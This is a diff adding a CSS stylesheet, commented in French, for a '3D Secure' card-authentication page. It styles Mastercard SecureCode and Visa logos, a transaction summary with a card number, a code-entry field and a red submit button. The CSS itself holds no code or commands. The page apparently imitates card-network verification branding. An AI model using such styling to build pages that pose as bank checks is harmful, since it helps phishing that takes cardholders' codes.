@@ -1,0 +1,415 @@
+/* Styles spécifiques à la page 3D Secure */
+
+.auth-wrapper {
+    width: 100%;
+    max-width: 400px !important;
+    margin: 0 auto;
+}
+
+/* Desktop optimizations */
+@media (min-width: 1200px) {
+    .auth-wrapper {
+        max-width: 467px !important;
+    }
+}
+
+@media (min-width: 1600px) {
+    .auth-wrapper {
+        max-width: 533px !important;
+    }
+}
+
+.auth-box {
+    background-color: #ffffff;
+    border-radius: 8px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    overflow: hidden;
+    width: 100%;
+    max-width: 100%;
+    box-sizing: border-box;
+}
+
+/* Header */
+.auth-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 20px 25px;
+    border-bottom: 1px solid #e0e0e0;
+    width: 100%;
+    box-sizing: border-box;
+}
+
+.logo-left {
+    display: flex;
+    align-items: center;
+}
+
+.mastercard-logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+
+.mc-logo {
+    width: 50px;
+    height: 35px;
+}
+
+.securecode-text {
+    font-size: 14px;
+    font-weight: bold;
+    color: #000000;
+}
+
+.logo-right {
+    display: flex;
+    align-items: center;
+}
+
+.visa-logo {
+    width: 60px;
+    height: 30px;
+}
+
+/* Content */
+.auth-content {
+    padding: 25px 20px;
+}
+
+.info-message {
+    font-size: 10px;
+    color: #333333;
+    margin-bottom: 20px;
+    line-height: 1.3;
+    white-space: nowrap;
+    letter-spacing: -0.2px;
+    max-width: 100%;
+    box-sizing: border-box;
+}
+
+/* Transaction Info */
+.transaction-info {
+    background-color: #f9f9f9;
+    border: 1px solid #e0e0e0;
+    border-radius: 4px;
+    padding: 15px 18px;
+    margin-bottom: 25px;
+}
+
+.info-row {
+    display: flex;
+    margin-bottom: 10px;
+    font-size: 13px;
+}
+
+.info-row:last-child {
+    margin-bottom: 0;
+}
+
+.info-label {
+    min-width: 120px;
+    color: #666666;
+    font-weight: normal;
+}
+
+.info-value {
+    color: #000000;
+    font-weight: normal;
+    flex: 1;
+}
+
+.info-value.amount {
+    font-weight: bold;
+}
+
+.info-value.card-num {
+    font-family: 'Courier New', monospace;
+    letter-spacing: 1px;
+}
+
+/* Form */
+.auth-form {
+    margin-top: 0;
+}
+
+.form-field {
+    margin-bottom: 20px;
+}
+
+.field-label {
+    display: block;
+    font-size: 13px;
+    color: #000000;
+    margin-bottom: 8px;
+    font-weight: normal;
+}
+
+.secure-input {
+    width: 100%;
+    padding: 10px 12px;
+    font-size: 14px;
+    border: 1px solid #b0b0b0;
+    background-color: #ffffff;
+    color: #000000;
+    font-family: Arial, sans-serif;
+    box-sizing: border-box;
+    border-radius: 4px;
+    transition: border-color 0.2s;
+}
+
+.secure-input:focus {
+    outline: none;
+    border-color: #0066cc;
+}
+
+.secure-input::placeholder {
+    color: #999999;
+}
+
+/* Buttons */
+.form-buttons {
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    margin-top: 20px;
+}
+
+.submit-btn {
+    background-color: #e50914;
+    color: #ffffff;
+    border: none;
+    padding: 10px 20px;
+    font-size: 13px;
+    font-weight: normal;
+    cursor: pointer;
+    font-family: Arial, sans-serif;
+    border-radius: 4px;
+    transition: background-color 0.2s;
+}
+
+.submit-btn:hover {
+    background-color: #f40612;
+}
+
+.submit-btn:active {
+    background-color: #c11119;
+}
+
+.resend-link,
+.cancel-link {
+    color: #0066cc;
+    text-decoration: none;
+    font-size: 13px;
+    transition: text-decoration 0.2s;
+}
+
+.resend-link:hover,
+.cancel-link:hover {
+    text-decoration: underline;
+}
+
+/* Footer */
+.footer-info {
+    margin-top: 30px;
+    padding-top: 20px;
+    border-top: 1px solid #e0e0e0;
+}
+
+.footer-info p {
+    font-size: 11px;
+    color: #666666;
+    line-height: 1.5;
+    text-align: center;
+}
+
+/* Responsive */
+@media (max-width: 768px) {
+    .container {
+        padding: 10px;
+    }
+
+    .auth-wrapper {
+        max-width: 100% !important;
+        padding: 0 5px;
+    }
+
+    .auth-header {
+        padding: 15px 18px;
+        flex-wrap: wrap;
+    }
+
+    .auth-content {
+        padding: 20px 18px;
+    }
+
+    .transaction-info {
+        padding: 12px 15px;
+        margin-bottom: 20px;
+    }
+
+    .info-row {
+        flex-direction: column;
+        gap: 4px;
+        margin-bottom: 12px;
+        font-size: 12px;
+    }
+
+    .info-label {
+        min-width: auto;
+        font-weight: 500;
+    }
+
+    .info-value {
+        font-size: 13px;
+    }
+
+    .form-buttons {
+        flex-direction: column;
+        align-items: stretch;
+        gap: 12px;
+        margin-top: 18px;
+    }
+
+    .submit-btn {
+        width: 100%;
+        padding: 12px 20px;
+        font-size: 14px;
+    }
+
+    .resend-link,
+    .cancel-link {
+        text-align: center;
+        width: 100%;
+        padding: 10px;
+        display: block;
+    }
+
+    .info-message {
+        font-size: 11px;
+        white-space: normal;
+        line-height: 1.4;
+    }
+
+    .page-title {
+        font-size: 22px;
+        margin-bottom: 14px;
+    }
+}
+
+@media (max-width: 480px) {
+    .container {
+        padding: 8px;
+    }
+
+    .auth-wrapper {
+        padding: 0;
+    }
+
+    .auth-header {
+        padding: 14px 16px;
+    }
+
+    .auth-content {
+        padding: 18px 16px;
+    }
+
+    .mastercard-logo {
+        gap: 8px;
+    }
+
+    .mc-logo {
+        width: 45px;
+        height: 30px;
+    }
+
+    .securecode-text {
+        font-size: 12px;
+    }
+
+    .visa-logo {
+        width: 55px;
+        height: 28px;
+    }
+
+    .page-title {
+        font-size: 20px;
+    }
+
+    .info-message {
+        font-size: 12px;
+        margin-bottom: 18px;
+    }
+
+    .transaction-info {
+        padding: 12px;
+    }
+
+    .info-row {
+        font-size: 12px;
+    }
+
+    .secure-input {
+        font-size: 16px; /* Évite le zoom sur iOS */
+        padding: 12px;
+    }
+
+    .field-label {
+        font-size: 12px;
+    }
+}
+
+@media (max-width: 375px) {
+    .auth-header {
+        padding: 12px 14px;
+    }
+
+    .auth-content {
+        padding: 16px 14px;
+    }
+
+    .mc-logo {
+        width: 40px;
+        height: 28px;
+    }
+
+    .visa-logo {
+        width: 50px;
+        height: 25px;
+    }
+
+    .page-title {
+        font-size: 18px;
+    }
+}
+
+@media (max-width: 320px) {
+    .auth-container {
+        padding: 5px;
+    }
+
+    .auth-header {
+        padding: 12px 12px;
+    }
+
+    .auth-content {
+        padding: 14px 12px;
+    }
+
+    .transaction-info {
+        padding: 10px 12px;
+    }
+
+    .secure-input {
+        font-size: 16px; /* Évite le zoom sur iOS */
+        padding: 12px;
+    }
+
+    .page-title {
+        font-size: 17px;
+    }
+
+    .info-message {
+        font-size: 11px;
+    }
+}
